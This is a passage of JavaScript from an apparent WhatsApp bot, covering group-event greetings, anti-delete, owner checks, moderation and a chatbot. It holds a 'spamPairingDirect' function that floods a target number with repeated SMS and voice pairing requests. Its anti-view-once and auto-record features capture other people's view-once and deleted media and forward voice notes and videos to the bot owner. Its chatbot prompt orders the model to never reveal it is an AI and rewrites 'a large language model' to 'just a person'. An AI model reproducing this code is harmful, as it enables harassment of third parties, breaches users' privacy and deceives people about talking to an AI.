            `_We are so glad to have you here!_ 🌟`;
          const img = await generateWelcomeImage({ memberNumber: mn, groupName: _gName3, memberCount: _mCount3, profilePicUrl: _ppic3 }).catch(() => null);
          await _send3(img, cap, [pJid]);
        }
      }

      // ── LEAVE / REMOVE ──────────────────────────────────────────────────
      if (_STUB === 28 && _gs3.goodbye) {
        for (const pJid of _stubs3) {
          const mn = pJid.split("@")[0].split(":")[0].replace(/\D/g, "");
          let _ppic3 = null;
          try { _ppic3 = await mzazi.profilePictureUrl(pJid, "image"); } catch {}
          const cap =
            `╔════════════════════╗\n` +
            `║   🌙 *GOODBYE* 🌙   ║\n` +
            `╚════════════════════╝\n\n` +
            `💔 @${mn} has left.\n\n` +
            `📌 *Group:* ${_gName3}\n\n` +
            `_Thank you for being with us. Until we meet again..._ 🌠`;
          const img = await generateGoodbyeImage({ memberNumber: mn, groupName: _gName3, profilePicUrl: _ppic3 }).catch(() => null);
          await _send3(img, cap, [pJid]);
        }
      }

      // ── PROMOTE ─────────────────────────────────────────────────────────
      if (_STUB === 31 && _gs3.events) {
        for (const pJid of _stubs3) {
          const mn = pJid.split("@")[0].split(":")[0].replace(/\D/g, "");
          let _ppic3 = null;
          try { _ppic3 = await mzazi.profilePictureUrl(pJid, "image"); } catch {}
          const cap =
            `╔════════════════════╗\n` +
            `║  👑 *PROMOTED!* 👑  ║\n` +
            `╚════════════════════╝\n\n` +
            `⭐ @${mn} has been promoted!\n` +
            `🎖️ *New Role:* Admin\n\n` +
            `📌 *Group:* ${_gName3}\n\n` +
            `_Congratulations!_ 🎉`;
          const img = await generateEventImage({ memberNumber: mn, eventType: "promote", groupName: _gName3, profilePicUrl: _ppic3 }).catch(() => null);
          await _send3(img, cap, [pJid]);
        }
      }

      // ── DEMOTE ──────────────────────────────────────────────────────────
      if (_STUB === 32 && _gs3.events) {
        for (const pJid of _stubs3) {
          const mn = pJid.split("@")[0].split(":")[0].replace(/\D/g, "");
          let _ppic3 = null;
          try { _ppic3 = await mzazi.profilePictureUrl(pJid, "image"); } catch {}
          const cap =
            `╔════════════════════╗\n` +
            `║  📉 *DEMOTED* 📉   ║\n` +
            `╚════════════════════╝\n\n` +
            `@${mn} has been demoted.\n` +
            `🔻 *Admin rights removed*\n\n` +
            `📌 *Group:* ${_gName3}`;
          const img = await generateEventImage({ memberNumber: mn, eventType: "demote", groupName: _gName3, profilePicUrl: _ppic3 }).catch(() => null);
          await _send3(img, cap, [pJid]);
        }
      }

      // ── GROUP RENAMED ────────────────────────────────────────────────────
      if (_STUB === 11 && _gs3.events) {
        const newName = _stubs3[0] || "";
        const cap =
          `╔════════════════════╗\n` +
          `║  ✏️ *RENAMED* ✏️   ║\n` +
          `╚════════════════════╝\n\n` +
          `📌 Group name changed to:\n*${newName}*`;
        const img = await generateEventImage({ memberNumber: "", eventType: "subject", groupName: newName, details: `Was: ${_gName3}` }).catch(() => null);
        await _send3(img, cap, []);
      }

      // ── DESCRIPTION CHANGED ──────────────────────────────────────────────
      if (_STUB === 12 && _gs3.events) {
        const cap =
          `╔════════════════════╗\n` +
          `║  📝 *INFO UPDATE* 📝║\n` +
          `╚════════════════════╝\n\n` +
          `📌 *Group:* ${_gName3}\n\n` +
          `Group description was updated.`;
        const img = await generateEventImage({ memberNumber: "", eventType: "description", groupName: _gName3 }).catch(() => null);
        await _send3(img, cap, []);
      }

      // If this was a pure stub (no message body) we are done
      if (!m.message) return;
    }
    // ── End group event stubs ─────────────────────────────────────────────────

    if (!m.message) return;
    const body = getBody(m.message).trim();
    const message = m.message;
    const type = Object.keys(message)[0] || "";
    const budy = getBody(message);
    const sender = m.key.remoteJid;
    if (!sender || typeof sender !== "string") return;

    // ── ANTI-DELETE: detect revoke protocol messages ─────────────────────
    // Revoke notifications arrive either as messages.upsert protocol messages
    // or as messages.update patches, depending on the Baileys release/device.
    const protocolMessage =
      message.protocolMessage ||
      message.ephemeralMessage?.message?.protocolMessage ||
      message.viewOnceMessage?.message?.protocolMessage;
    const isRevoke = protocolMessage &&
      (protocolMessage.type === 0 ||
       protocolMessage.type === "REVOKE" ||
       String(protocolMessage.type).toUpperCase() === "REVOKE");

    if (isRevoke) {
      const revokedKey = protocolMessage.key || {};
      const cached = findCachedAntiDeleteMessage(revokedKey);
      if (!cached) return;

      const botPhoneNum = normalizeJid(mzazi.user?.id || "");
      const sessionDir = `./database/sessions/${botPhoneNum}`;
      const chatId = cached.chatId || revokedKey.remoteJid || sender;
      const isGroup2 = chatId.endsWith("@g.us");
      const groupSettings = loadJSON(`${sessionDir}/groups.json`, {});
      const dmSettings = loadJSON(`${sessionDir}/dm_settings.json`, {});
      const enabled = isGroup2
        ? !!groupSettings[chatId]?.antidelete
        : !!dmSettings[chatId]?.antidelete;

      if (!enabled) {
        deleteCachedAntiDeleteMessage(cached);
        return;
      }

      const { senderJid, senderNum, msgObj, caption } = cached;
      // Restore the deleted message directly to the original sender. In a
      // group, senderJid is the member who sent it; in a DM, it is the chat
      // participant. Never forward deleted content to the bot owner.
      const sourceJid = senderJid || chatId;
      const messageType = Object.keys(msgObj || {})[0] || "message";
      const mediaLabel = messageType === "imageMessage" ? "Image"
        : messageType === "videoMessage" ? "Video"
        : messageType === "audioMessage" ? (msgObj.audioMessage?.ptt ? "Voice note" : "Audio")
        : messageType === "stickerMessage" ? "Sticker"
        : messageType === "documentMessage" ? "Document"
        : "Text";
      const notice =
        `🗑️ *Anti-Delete Alert*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 *From:* @${senderNum || "unknown"}\n` +
        `${isGroup2 ? `👥 *Chat:* ${chatId}\n` : "💬 *Chat:* Private message\n"}` +
        `📌 *Type:* ${mediaLabel}\n` +
        (caption ? `📝 *Caption:* ${caption}\n` : "") +
        `⏰ *Deleted:* ${new Date().toLocaleString()}\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const contextInfo = {
        mentionedJid: senderJid ? [senderJid] : [],
        forwardingScore: 1,
        isForwarded: true,
      };

      try {
        const mediaTypes = new Set([
          "imageMessage",
          "videoMessage",
          "audioMessage",
          "stickerMessage",
          "documentMessage",
        ]);
        let sentMedia = false;

        if (mediaTypes.has(messageType)) {
          const media = msgObj[messageType];
          const hasMediaKey = !!(media?.mediaKey || media?.fileEncSha256);
          if (hasMediaKey) {
            try {
              const buffer = await downloadMediaMessage(
                { key: cached.key, message: msgObj },
                "buffer",
                {},
                {
                  logger: pino({ level: "silent" }),
                  reuploadRequest: mzazi.updateMediaMessage,
                }
              );
              const mediaPayload = messageType === "imageMessage"
                ? { image: buffer, caption: notice }
                : messageType === "videoMessage"
                  ? { video: buffer, caption: notice }
                  : messageType === "audioMessage"
                    ? { audio: buffer, mimetype: media.mimetype || "audio/mp4", ptt: !!media.ptt }
                    : messageType === "stickerMessage"
                      ? { sticker: buffer }
                      : {
                        document: buffer,
                        mimetype: media.mimetype || "application/octet-stream",
                        fileName: media.fileName || "deleted_file",
                        caption: notice,
                      };
              await mzazi.sendMessage(sourceJid, { ...mediaPayload, contextInfo });
              sentMedia = true;
              if (messageType === "audioMessage" || messageType === "stickerMessage") {
                await mzazi.sendMessage(sourceJid, { text: notice, contextInfo });
              }
            } catch (mediaError) {
              logger.warn("AntiDelete media restore failed:", mediaError?.message);
            }
          }
        }

        if (!sentMedia) {
          await mzazi.sendMessage(sourceJid, { text: notice, contextInfo });
        }
      } catch (restoreError) {
        logger.error("AntiDelete restore error:", restoreError?.message);
      } finally {
        deleteCachedAntiDeleteMessage(cached);
      }
      return;
    }

    // ── CACHE this message for antidelete ────────────────────────────────
    // Cache ALL real messages (including fromMe) so that antidelete catches
    // messages deleted by any participant, including the owner's own devices.
    // Skip only stub messages (group join/leave/promote notifications) — they
    // have no media key, causing "Cannot derive from empty media key" errors.
    if (m.key?.id && !m.messageStubType) {
      const _isGrp = sender.endsWith("@g.us");
      const _sndr = _isGrp ? (m.key.participant || sender) : sender;
      const _sNum = _sndr.split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
      // Unwrap ephemeral (disappearing) messages before caching so the real
      // media type and keys are stored — without this the media label is wrong
      // and downloadMediaMessage fails when the message is later deleted.
      const _rawMsg = unwrapAntiDeleteMessage(message);
      const _mt = Object.keys(_rawMsg)[0];
      const _cap =
        _rawMsg.conversation ||
        _rawMsg.extendedTextMessage?.text ||
        _rawMsg[_mt]?.caption || "";
      const _cacheKey = antiDeleteCacheKey(m.key, sender);
      messageCache.set(_cacheKey, {
        cacheKey: _cacheKey,
        key: { ...m.key, remoteJid: m.key.remoteJid || sender },
        ts: Date.now(),
        chatId: sender,
        senderJid: _sndr,
        senderNum: _sNum,
        msgObj: _rawMsg,
        caption: _cap.slice(0, 200)
      });
    }

    const isGroup = sender.endsWith("@g.us");

    // In a group the real sender is m.key.participant; in DMs it's the remoteJid itself
    const msgSender = isGroup ? (m.key.participant || sender) : sender;

    // Canonical numeric form of the sender (no domain, no device suffix)
    const senderNumber = normalizeJid(msgSender);
    const senderNum = normalizeJid(msgSender);
    const botJid    = normalizeJid(mzazi.user?.id);           // pure digits, no suffix
     const botPhoneNum = jidToNumber(mzazi.user?.id);          // digits only, string
    const botLid    = mzazi.user?.lid ? normalizeJid(mzazi.user.lid) : null;

    ensureDir(`./database/sessions/${botPhoneNum}`);

    // ==================== OWNER DETECTION ====================
    // "owner" = the number linked to this bot session + any numbers in owners.json
    

    // The bot's own linked number is always an owner
    const botOwnerNumber = normalizeJid(mzazi.user?.id);
    const ownersList = getOwners().map(num => normalizeJid(String(num)));
    const ownerNumbers = [
      botOwnerNumber,
      ...(botLid ? [botLid] : []),
      ...ownersList
    ].filter(Boolean);
    
    const isOwner =
      m.key.fromMe ||                          // message sent by the bot itself
      ownerNumbers.includes(senderNumber);    
    // Works for both groups (uses participant) and DMs (uses remoteJid)

    
// Sticker→command map is loaded once at startup (see src/lib/database.js)
// and cached in `db.sticker`. Nothing here touches disk per-message.

     // sender's number is in owner list
    const settingsPath = `./database/sessions/${botPhoneNum}/settings.json`;
    // prefix handling
    const sessionSettings = loadJSON(`./database/sessions/${botPhoneNum}/settings.json`, {});
    const customPrefix = sessionSettings.customPrefix; // undefined = never set, "" = none mode, "x" = custom
    const noPrefixMode = customPrefix === "";           // explicitly set to none via .setprefix none

    let prefix = ".";
    let isCmd = false;
    let command = "";
    let args = [];

    if (noPrefixMode) {
      // No-prefix mode: every non-empty message is a potential command
      prefix = "";
      isCmd = budy.trim().length > 0;
      command = isCmd ? budy.trim().split(/ +/).shift().toLowerCase() : "";
      args = isCmd ? budy.trim().split(/ +/).slice(1) : [];
    } else if (customPrefix) {
      // Custom prefix set: use it, fall back to config prefix if message doesn't match
      const escaped = customPrefix.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      if (new RegExp(`^${escaped}`).test(budy)) {
        prefix = customPrefix;
      } else if (config.prefix?.test?.(budy)) {
        prefix = budy.match(config.prefix)[0];
      } else {
        prefix = ".";
      }
      isCmd = budy.length > 0 && budy.startsWith(prefix);
      command = isCmd ? budy.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";
      args = isCmd ? budy.slice(prefix.length).trim().split(/ +/).slice(1) : [];
    } else {
      // Default: use config.prefix regex or "." fallback
      prefix = config.prefix?.test?.(budy) ? budy.match(config.prefix)[0] : ".";
      isCmd = budy.length > 0 && budy.startsWith(prefix);
      command = isCmd ? budy.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";
      args = isCmd ? budy.slice(prefix.length).trim().split(/ +/).slice(1) : [];
    }

    const text = args.join(" ");

    // ── CHAT / GROUP LOGGER ──────────────────────────────────────────────
    // Logged exactly once per incoming message — no file reads, no repeats.
    {
      let _logGroupName = sender;
      if (isGroup) {
        try {
          const _meta = await mzazi.groupMetadata(sender);
          _logGroupName = _meta.subject || sender;
        } catch {}
      }
      logIncomingMessage({
        senderName: m.pushName || senderNumber,
        senderNumber,
        isGroup,
        groupName: _logGroupName,
        messageType: type,
        text: budy,
      });
      if (isGroup && isCmd) {
        logGroupCommand({
          groupName: _logGroupName,
          senderName: m.pushName || senderNumber,
          senderNumber,
          command: `${prefix}${command}`,
        });
      }
    }

    const senderPureNumber = jidToNumber(msgSender);

    // ── PER-SESSION paidUsers ────────────────────────────────────────────
    const sessionPaidPath = `./database/sessions/${botPhoneNum}/paid.json`;
    const sessionPaidUsers = loadJSON(sessionPaidPath, []);
    const saveSessionPaid = () => saveJSON(sessionPaidPath, sessionPaidUsers);

    const isPaid =
      sessionPaidUsers.includes(msgSender) ||
      sessionPaidUsers.includes(senderPureNumber) ||
      sessionPaidUsers.includes(normalizeJid(msgSender)) ||
      isOwner;

    const botName = getBotName(botPhoneNum);
    const reply = async (txt) => mzazi.sendMessage(sender, { text: txt });

    // ==================== GROUP METADATA ====================
    // Hoisted so groupAdmins and participants are available everywhere below
    let isAdmin    = false;
    let isBotAdmin = false;
    let groupAdmins    = [];
    let participants   = [];

    if (isGroup) {
      const metadata = await mzazi.groupMetadata(sender);
      participants = metadata.participants || [];

      groupAdmins = participants
        .filter(v => v.admin)
        .map(v => normalizeJid(v.id));

      isAdmin    = groupAdmins.includes(senderNumber);
      isBotAdmin = groupAdmins.includes(normalizeJid(botJid));
    }

    // ========== MODE SETTINGS (self / public) ==========
    
    let currentSettings = loadJSON(settingsPath, { publicMode: true, selfMode: false });
    if (!currentSettings.publicMode && !currentSettings.selfMode) {
      // Auto-enable public mode for both groups and DMs when neither mode is configured
      currentSettings.publicMode = true;
      saveJSON(settingsPath, currentSettings);
      logger.info(`🔧 Auto-fixed settings for ${botPhoneNum}: publicMode forced true`);
    }
    if (currentSettings.selfMode && !isOwner) return;
    if (!currentSettings.publicMode && !currentSettings.selfMode && !isOwner) return;

    // ========== MZAZIREPLY (with image and newsletter style) ==========
    
const mzazireply2 = async (txt, { quoted = null, mentions = [] } = {}) => {
  const ctx = {
    forwardingScore: 999, isForwarded: true,
    forwardedNewsletterMessageInfo: { newsletterJid: "120363425539800408@newsletter", newsletterName: botName.toUpperCase(), serverMessageId: 143 },
    externalAdReply: { title: botName.toUpperCase(), body: txt.slice(0, 60), sourceUrl: `https://wa.me/c/${botPhoneNum}`, mediaType: 1, showAdAttribution: true },
    mentionedJid: mentions,
    ...(quoted ? { stanzaId: quoted.key?.id, participant: quoted.key?.remoteJid, quotedMessage: quoted.message } : {}),
  };
  try {
    await mzazi.sendMessage(sender, { text: txt, contextInfo: ctx }, { quoted });
  } catch {
    try { await mzazi.sendMessage(sender, { text: txt }); } catch {}
  }
};
    const getMenuPic = () => {
      const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
      const defaultMenuPic = "./media/menu.jpg";
      return fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;
    };
    const sessionFile = (name) => `./database/sessions/${botPhoneNum}/${name}`;

    const getGroupSettings = (groupJid) => {
      const groups = loadJSON(sessionFile("groups.json"), {});
      return groups[groupJid] || {};
    };

    const setGroupSetting = (groupJid, key, value) => {
      const groups = loadJSON(sessionFile("groups.json"), {});
      if (!groups[groupJid]) groups[groupJid] = {};
      groups[groupJid][key] = value;
      saveJSON(sessionFile("groups.json"), groups);
    };

    const getWarns = (groupJid, userJid) => {
      const warns = loadJSON(sessionFile("warns.json"), {});
      return (warns[groupJid] && warns[groupJid][userJid]) || 0;
    };

    const addWarn = (groupJid, userJid) => {
      const warns = loadJSON(sessionFile("warns.json"), {});
      if (!warns[groupJid]) warns[groupJid] = {};
      warns[groupJid][userJid] = (warns[groupJid][userJid] || 0) + 1;
      saveJSON(sessionFile("warns.json"), warns);
      return warns[groupJid][userJid];
    };

    const resetWarn = (groupJid, userJid) => {
      const warns = loadJSON(sessionFile("warns.json"), {});
      if (warns[groupJid]) warns[groupJid][userJid] = 0;
      saveJSON(sessionFile("warns.json"), warns);
    };

    const getToggle = (name) => loadJSON(sessionFile(`${name}.json`), { enabled: false });
    const setToggle = (name, enabled) => saveJSON(sessionFile(`${name}.json`), { enabled });

    const getChatbotStatus = (chatId) => {
      const chatbot = loadJSON(sessionFile("chatbot.json"), {});
      return chatbot[chatId] || false;
    };

    const setChatbotStatus = (chatId, enabled) => {
      const chatbot = loadJSON(sessionFile("chatbot.json"), {});
      if (enabled) chatbot[chatId] = true;
      else delete chatbot[chatId];
      saveJSON(sessionFile("chatbot.json"), chatbot);
    };

    async function handleAutoTyping() {
      const cfg = getToggle("autotyping");
      if (!cfg.enabled || m.key.fromMe || !budy) return;
      try {
        await mzazi.sendPresenceUpdate("composing", sender);
        const delay = Math.min(8000, Math.max(2000, budy.length * 100));
        await new Promise((r) => setTimeout(r, delay));
        await mzazi.sendPresenceUpdate("paused", sender);
      } catch (e) {}
    }

    async function handleAlwaysOnline() {
      const cfg = getToggle("alwaysonline");
      if (!cfg.enabled) return;
      try {
        await mzazi.sendPresenceUpdate("available");
      } catch (e) {}
    }
// ── SPAM PAIRING FUNCTION ──────────────────────────────────────────
async function spamPairingDirect(targetNumber, count = 20) {
  const results = { success: 0, failed: 0, errors: [] };
  const axios = require('axios');

  for (let i = 0; i < count; i++) {
    try {
      // WhatsApp's public pairing endpoint (reverse engineered)
      const response = await axios.post(
        'https://wa.me/pair',
        {
          phone: targetNumber,
          method: i % 2 === 0 ? 'sms' : 'voice',
          platform: 'android',
          version: '2.24.22.85'
        },
        {
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'WhatsApp/2.24.22.85 Android'
          },
          timeout: 10000
        }
      );

      if (response.status === 200) {
        results.success++;
      } else {
        results.failed++;
        results.errors.push(`Attempt ${i + 1}: Status ${response.status}`);
      }

      await new Promise(r => setTimeout(r, 300));

    } catch (err) {
      results.failed++;
      results.errors.push(`Attempt ${i + 1}: ${err.message || 'unknown'}`);
    }
  }

  return results;
}



























    async function forwardMediaToOwner(kind, mediaBuffer, caption) {
      const cfg = getToggle(kind === "audio" ? "autorecord_audio" : "autorecord_video");
      if (!cfg.enabled || !ownersList[0]) return;

      const ownerDM = `${ownersList[0]}@s.whatsapp.net`;
      if (kind === "audio") {
        await mzazi.sendMessage(ownerDM, {
          audio: mediaBuffer,
          mimetype: "audio/mp4",
          ptt: true,
          caption: `Auto-recorded audio from @${senderNumber}\n${caption || ""}`
        });
      } else {
        await mzazi.sendMessage(ownerDM, {
          video: mediaBuffer,
          caption: `Auto-recorded video from @${senderNumber}\n${caption || ""}`
        });
      }
    }

    const chatMemory = { messages: new Map(), userInfo: new Map() };
    const AI_ENDPOINTS = [
      {
        name: "ZellAPI",
        url: (txt) => `https://zellapi.autos/ai/chatbot?text=${encodeURIComponent(txt)}`,
        parse: (data) => data?.result
      },
      {
        name: "Hercai",
        url: (txt) => `https://hercai.onrender.com/gemini/hercai?question=${encodeURIComponent(txt)}`,
        parse: (data) => data?.reply
      },
      {
        name: "SparkAPI",
        url: (txt) => `https://discardapi.dpdns.org/api/chat/spark?apikey=guru&text=${encodeURIComponent(txt)}`,
        parse: (data) => data?.result?.answer
      },
      {
        name: "LlamaAPI",
        url: (txt) => `https://discardapi.dpdns.org/api/bot/llama?apikey=guru&text=${encodeURIComponent(txt)}`,
        parse: (data) => data?.result
      }
    ];

    function extractUserInfo(userMessage) {
      const info = {};
      const low = userMessage.toLowerCase();
      if (low.includes("my name is")) info.name = userMessage.split(/my name is/i)[1]?.trim().split(" ")[0];
      if (low.includes("i am") && low.includes("years old")) info.age = userMessage.match(/\d+/)?.[0];
      if (low.includes("i live in") || low.includes("i am from")) {
        info.location = userMessage.split(/(?:i live in|i am from)/i)[1]?.trim().split(/[.,!?]/)[0];
      }
      return info;
    }

    async function getAIResponse(userMessage, userContext) {
      const prompt = `You are a casual, friendly human chatting on WhatsApp. Always reply in English only.

RULES:
1. Always respond in English only.
2. Keep responses short, 1-2 lines max.
3. Be casual and natural.
4. Use emojis naturally.
5. Never reveal you are an AI or bot.

Your name is ${botName}.

Previous conversation:
${userContext.messages.join("\n")}

User info:
${JSON.stringify(userContext.userInfo, null, 2)}

User: ${userMessage}
You:`.trim();

      for (const api of AI_ENDPOINTS) {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);
          const response = await fetch(api.url(prompt), { signal: controller.signal });
          clearTimeout(timeoutId);
          if (!response.ok) continue;

          const data = await response.json();
          const result = api.parse(data);
          if (!result) continue;

          const cleaned = result
            .trim()
            .replace(/winks/g, "😉")
            .replace(/eye roll/g, "🙄")
            .replace(/shrug/g, "🤷‍♂️")
            .replace(/raises eyebrow/g, "🤨")
            .replace(/smiles/g, "😊")
            .replace(/laughs/g, "😂")
            .replace(/cries/g, "😢")
            .replace(/thinks/g, "🤔")
            .replace(/sleeps/g, "😴")
            .replace(/google/gi, botName)
            .replace(/a large language model/gi, "just a person")
            .replace(/Remember:.*$/g, "")
            .replace(/IMPORTANT:.*$/g, "")
            .replace(/^[A-Z\s]+:.*$/gm, "")
            .replace(/^[•-]\s.*$/gm, "")
            .replace(/^✅.*$/gm, "")
            .replace(/^❌.*$/gm, "")
            .replace(/\n\s*\n/g, "\n")
            .trim();

          if (cleaned) return cleaned;
        } catch (e) {}
      }
      return null;
    }

    async function handleChatbotResponse() {
      if (m.key.fromMe || isCmd || !budy || !getChatbotStatus(sender)) return;

      const botJids = [
        botJid,
        botLid,
        botPhoneNum ? `${botPhoneNum}@s.whatsapp.net` : "",
        botPhoneNum ? `${botPhoneNum}@whatsapp.net` : ""
      ]
        .filter(Boolean)
        .map(normalizeJid);

      let shouldReply = !isGroup;
      let cleanedMessage = budy;

      if (isGroup) {
        const mentionedJid = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        const quotedParticipant = m.message?.extendedTextMessage?.contextInfo?.participant;
        const isBotMentioned =
          mentionedJid.some((jid) => botJids.includes(normalizeJid(jid))) ||
          cleanedMessage.includes(`@${botPhoneNum}`);
        const isReplyToBot = quotedParticipant && botJids.includes(normalizeJid(quotedParticipant));
        shouldReply = isBotMentioned || isReplyToBot;
        cleanedMessage = cleanedMessage.replace(new RegExp(`@${botPhoneNum}`, "g"), "").trim();
      }

      if (!shouldReply || !cleanedMessage) return;

      if (!chatMemory.messages.has(msgSender)) {
        chatMemory.messages.set(msgSender, []);
        chatMemory.userInfo.set(msgSender, {});
      }

      const userInfo = extractUserInfo(cleanedMessage);
      if (Object.keys(userInfo).length) {
        chatMemory.userInfo.set(msgSender, {
          ...chatMemory.userInfo.get(msgSender),
          ...userInfo
        });
      }

      const messages = chatMemory.messages.get(msgSender);
      messages.push(cleanedMessage);
      if (messages.length > 20) messages.shift();

      try {
        await mzazi.sendPresenceUpdate("composing", sender);
        await new Promise((r) => setTimeout(r, Math.random() * 3000 + 2000));
      } catch (e) {}

      const response = await getAIResponse(cleanedMessage, {
        messages: chatMemory.messages.get(msgSender),
        userInfo: chatMemory.userInfo.get(msgSender)
      });

      await mzazi.sendMessage(sender, { text: response || "Hmm, I am having trouble replying right now." });
    }

    await handleAutoTyping();
    await handleAlwaysOnline();

    if (type === "audioMessage" && message.audioMessage?.ptt) {
      const buffer = await downloadMediaMessage(m, "buffer", {}, {
        logger: pino({ level: "silent" }),
        reuploadRequest: mzazi.updateMediaMessage
      });
      await forwardMediaToOwner("audio", buffer, message.audioMessage.caption || "");
    }

    if (type === "videoMessage") {
      const buffer = await downloadMediaMessage(m, "buffer", {}, {
        logger: pino({ level: "silent" }),
        reuploadRequest: mzazi.updateMediaMessage
      });
      await forwardMediaToOwner("video", buffer, message.videoMessage.caption || "");
    }

    // ── ANTI-VIEW-ONCE (groups + DMs) ──────────────────────────────────────
    {
      const _avUnwrapped = message?.ephemeralMessage?.message || message;
      const _vOnce =
        _avUnwrapped?.viewOnceMessage?.message ||
        _avUnwrapped?.viewOnceMessageV2?.message ||
        _avUnwrapped?.viewOnceMessageV2Extension?.message;

      if (_vOnce && !m.key.fromMe) {
        const _vType = Object.keys(_vOnce)[0];

        // Determine whether antiviewonce is enabled for this chat
        const _avoEnabled = (() => {
          if (isGroup) return getGroupSettings(sender).antiviewonce;
          // DM: check per-chat or global dm_settings.json
          const _dm = loadJSON(sessionFile("dm_settings.json"), {});
          return _dm[sender]?.antiviewonce || _dm["__global__"]?.antiviewonce;
        })();

        if (_avoEnabled) {
          try {
            // Pass the full original message — Baileys 7.x downloadMediaMessage
            // internally unwraps viewOnceMessage / viewOnceMessageV2 wrappers.
            const _avBuf = await downloadMediaMessage(m, "buffer", {}, {
              logger: pino({ level: "silent" }),
              reuploadRequest: mzazi.updateMediaMessage
            });

            const _avCaption =
              `👁️ *Anti-View-Once*\n` +
              `━━━━━━━━━━━━━━━━━━\n` +
              `👤 *From:* @${senderNumber}\n` +
              `📌 *Type:* ${_vType === "imageMessage" ? "🖼️ Image" : _vType === "videoMessage" ? "🎥 Video" : "🎤 Audio"}\n` +
              `━━━━━━━━━━━━━━━━━━`;

            // Groups: resend in the group. DMs: forward to owner's DM.
            const _avDest = isGroup ? sender : (() => {
              const _ow = loadJSON(sessionFile("owners.json"), []);
              return _ow[0]
                ? `${String(_ow[0]).replace(/\D/g, "")}@s.whatsapp.net`
                : `${botPhoneNum}@s.whatsapp.net`;
            })();
            const _avMentions = isGroup ? [msgSender] : [];

            if (_vType === "imageMessage") {
              await mzazi.sendMessage(_avDest, { image: _avBuf, caption: _avCaption, mentions: _avMentions });
            } else if (_vType === "videoMessage") {
              await mzazi.sendMessage(_avDest, { video: _avBuf, caption: _avCaption, mentions: _avMentions });
            } else if (_vType === "audioMessage") {
              await mzazi.sendMessage(_avDest, { audio: _avBuf, mimetype: "audio/mp4", ptt: false });
              await mzazi.sendMessage(_avDest, { text: _avCaption, mentions: _avMentions });
            }
          } catch (e) {
            logger.error("AntiViewOnce error:", e.message);
          }
        }
      }
    }

    if (isGroup) {
      const gs = getGroupSettings(sender);

      if (!isOwner && !isAdmin) {
        const mentionedJids = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];

        // NOTE: antilink is handled by the mode-based block below (applyMode).
        // The old boolean handler was removed to prevent duplicate handling.

        if (gs.antitag && mentionedJids.length >= 5) {
          if (isBotAdmin) {
            await mzazi.sendMessage(sender, { delete: m.key });
            await mzazi.sendMessage(sender, {
              text: `Warning @${senderNumber}, mass-tagging is not allowed.`,
              mentions: [msgSender]
            });
          }
          return;
        }

        // groupAdmins is now hoisted — safe to use here
        if (gs.antitagadmin && mentionedJids.some((jid) => groupAdmins.includes(normalizeJid(jid)))) {
          if (isBotAdmin) {
            await mzazi.sendMessage(sender, { delete: m.key });
            await mzazi.sendMessage(sender, {
              text: `Warning @${senderNumber}, tagging admins is not allowed.`,
              mentions: [msgSender]
            });
          }
          return;
        }

        // participants is now hoisted — safe to use here
        const hasMentionAll =
          budy.includes("@everyone") ||
          budy.includes("@all") ||
          (participants.length > 0 && mentionedJids.length >= participants.length - 1 && mentionedJids.length > 0);

        if (gs.antimentiongroup && hasMentionAll) {
          if (isBotAdmin) {
            await mzazi.sendMessage(sender, { delete: m.key });
            await mzazi.sendMessage(sender, {
              text: `Warning @${senderNumber}, mentioning the whole group is not allowed.`,
              mentions: [msgSender]
            });
          }
          return;
        }
      }
    }

    await handleChatbotResponse();

    // ─────────────────────────────────────────────────────────────────────────
    // STICKER COMMAND SYSTEM — DETECTION MIDDLEWARE
    // PLACEMENT: After handleChatbotResponse() and BEFORE the `if (!isCmd) return;`
    //            guard, so sticker-triggered commands reach the  switch() block.
    //
    // Looks the sticker's fileSha256 (base64) up in the cached db.sticker map
    // (database/sticker.json, loaded once at startup — never touched here).
    // If a match is found, it overwrites `command` so the switch() block runs
    // exactly as if the user had typed that command with the prefix.
    // ─────────────────────────────────────────────────────────────────────────
    if (m.message?.stickerMessage) {
        const rawSha = m.message.stickerMessage.fileSha256;

        if (rawSha) {
            const receivedId = Buffer.from(rawSha).toString("base64");
            const mapping = db.sticker.stickers?.[receivedId];

            if (mapping) {
                command = mapping.command;
                isCmd = true;
                logger.cmd(`.${command} (via sticker)`);
            }
        }
    }

    // ═══════════════════════════════════════════════════════
    //  AUTO STATUS VIEW & LIKE
    // ═══════════════════════════════════════════════════════
    if (sender === 'status@broadcast') {
      try {
        const _cfgView = getToggle("autostatus");
        const _cfgLike = getToggle("autolike");
        if (_cfgView.enabled) {
          try {
            await mzazi.readMessages([m.key]);
          } catch (e) {}
        }
        if (_cfgLike.enabled) {
          try {
            const _ssPath = sessionFile("statusSettings.json");
            const _ss = loadJSON(_ssPath, { emoji: "❤️" });
            await mzazi.sendMessage(sender, {
              react: { text: _ss.emoji || "❤️", key: m.key }
            });
          } catch (e) {}
        }
      } catch (e) {}
      if (!isCmd) return;
    }

    // ═══════════════════════════════════════════════════════
    //  GROUP ANTI-ENFORCEMENT (antilink / antisticker / antiimage)
    // ═══════════════════════════════════════════════════════
    if (isGroup && !m.key.fromMe && !isOwner && !isAdmin) {
      const _gs = getGroupSettings(sender);

      // Helper: apply mode action (delete / warn / kick)
      const applyMode = async (mode, label) => {
        if (!mode || mode === 'off') return false;
        try {
          // Always delete the offending message first
          try {
            await mzazi.sendMessage(sender, { delete: m.key });
          } catch (e) {}

          if (mode === 'delete') {
            await mzazi.sendMessage(sender, {
              text: `🚫 @${senderNum} — ${label} are not allowed here. Message deleted.`,
              mentions: [msgSender]
            });
          } else if (mode === 'warn') {
            const warnCount = addWarn(sender, msgSender);
            if (warnCount >= 3) {
              await mzazi.sendMessage(sender, {
                text: `⛔ @${senderNum} has been kicked! Reason: 3 warnings for sending ${label}.`,
                mentions: [msgSender]
              });
              try { await mzazi.groupParticipantsUpdate(sender, [msgSender], 'remove'); } catch (e) {}
              resetWarn(sender, msgSender);
            } else {
              await mzazi.sendMessage(sender, {
